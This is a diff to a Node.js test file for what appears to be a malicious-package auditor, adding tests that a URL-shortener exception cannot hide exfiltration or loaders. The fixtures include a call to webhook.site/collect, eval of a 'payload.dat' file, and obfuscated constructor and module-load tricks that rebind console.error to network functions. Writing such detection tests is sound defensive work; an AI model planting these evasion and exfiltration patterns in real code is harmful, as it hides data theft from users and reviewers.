@@ -1,13 +1,19 @@
 "use strict";
 const test = require('node:test');
 const assert = require('node:assert/strict');
-const { onlyPassiveDiagnosticUrls } = require('../src/passive-url-evidence');
+const { onlyPassiveDiagnosticUrls: provePassive } = require('../src/passive-url-evidence');
 const { auditEvidence } = require('../src/auditor');
 const fixture = require('../benchmark/corpus/benign/url-shortener-with-capability.json');
 const url = 'https://goo.gl/MqrFmX';
 const domains = ['goo.gl', 'bit.ly'];
 const network = "const https = require('https'); module.exports.get = (u) => https.get(u);\n";
 const passive = `console.error('Documentation: ${url}');`;
+function onlyPassiveDiagnosticUrls(source, domains) {
+  return provePassive(source, domains, {
+    filePath: 'index.js', sourceCoverage: fixture.evidence.sourceCoverage,
+    sourceFiles: [{ path: 'package.json', content: fixture.evidence.sourceFiles['package.json'] }, { path: 'index.js', content: source }]
+  });
+}
 function report(source, extra = {}) {
   return auditEvidence({ ...fixture.evidence, ...extra,
     sourceFiles: { ...fixture.evidence.sourceFiles, 'index.js': source } });
@@ -87,4 +93,48 @@ test('passive shortener proof never changes hard-IP, webhook or stage-two loader
     `${network}${passive} https.get('https://webhook.site/collect');`,
     `${network}${passive} eval(require('fs').readFileSync('payload.dat','utf8'));`
   ]) assert.equal(report(source).findings.some(f => f.category === 'network-exfil-or-loader' && f.severity === 'high'), true, source);
+});
+
+
+test('a neighboring module cannot mutate console and inherit a passive URL exception', () => {
+  const input = structuredClone(fixture.evidence);
+  input.sourceFiles['package.json'] = JSON.stringify({ name: 'demo', main: 'patch.js' });
+  input.sourceFiles['patch.js'] = "const https=require('https'); console.error=https.get; require('./index').warn('x');";
+  input.sourceCoverage = { ...input.sourceCoverage, scannedFiles: 3, inventoryFiles: 3, runtimeFiles: ['patch.js', 'index.js'] };
+  const result = auditEvidence(input);
+  assert.notEqual(result.verdict, 'safe');
+  assert.ok(result.findings.some(f => f.category === 'network-exfil-or-loader' && f.file === 'index.js'));
+});
+
+test('missing inventory and any unknown neighboring source retain shortener uncertainty', () => {
+  for (const coverage of [undefined, null, {}, { complete: true },
+    { ...fixture.evidence.sourceCoverage, inventoryFiles: 3 },
+    { ...fixture.evidence.sourceCoverage, skippedFiles: 1 },
+    { ...fixture.evidence.sourceCoverage, reasons: ['unknown runtime source'] },
+    { ...fixture.evidence.sourceCoverage, runtimeFiles: ['index.js', 'missing.js'] },
+    { ...fixture.evidence.sourceCoverage, installTimeFiles: ['missing.js'] }]) {
+    assert.equal(shortenerFinding(network + passive, { sourceCoverage: coverage }), true);
+  }
+  for (const neighbor of ['patch.js', 'nested/patch.js', 'payload.dat', '.npmrc', 'README.md', 'nested/package.json']) {
+    const input = structuredClone(fixture.evidence);
+    input.sourceFiles[neighbor] = 'arbitrary neighboring bytes';
+    input.sourceCoverage.scannedFiles = input.sourceCoverage.inventoryFiles = 3;
+    assert.ok(auditEvidence(input).findings.some(f => f.category === 'network-exfil-or-loader'), neighbor);
+  }
+  assert.equal(provePassive(network + passive, domains), false, 'standalone text never asserts artifact-wide coverage');
+});
+
+
+test('computed constructor recovery and reflective dispatch cannot clear shortener uncertainty', () => {
+  for (const prefix of [
+    "(()=>{})['constructor']('console.error=fetch')();",
+    "(()=>{})['con'+'structor']('console.error=fetch')();",
+    "(()=>{})['\\x63onstructor']('console.error=fetch')();",
+    "module['con'+'structor']['_lo'+'ad']('con'+'sole')['er'+'ror']=https.get;"
+  ]) {
+    const source = network + prefix + passive;
+    assert.equal(onlyPassiveDiagnosticUrls(source, domains), false, prefix);
+    assert.equal(shortenerFinding(source), true, prefix);
+    assert.notEqual(report(source).verdict, 'safe', prefix);
+  }
 });
